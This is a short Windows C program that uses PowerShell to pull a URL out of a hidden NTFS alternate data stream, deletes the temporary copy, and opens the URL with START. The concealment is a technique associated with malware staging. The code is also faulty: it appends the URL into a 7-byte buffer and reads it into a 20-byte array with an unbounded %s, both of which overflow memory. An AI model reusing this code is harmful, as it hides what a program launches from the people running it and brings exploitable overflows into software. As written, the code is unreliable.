#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {

    // Retrieve URL from ADS
    char getURL[] = "Powershell Get-Content -Path MyFile.txt -Stream secretStream.txt > url.txt";
    system(getURL);

    // Retrieve URL from tempfile
    char link[20];
    FILE *fp = fopen("url.txt", "r");
    fscanf(fp, "%s", link);
    fclose(fp);
    system("del url.txt");

    // Visit URL
    char visitURL[] = "START ";
    strcat(visitURL, link);
    system(visitURL);

    return 0;
}


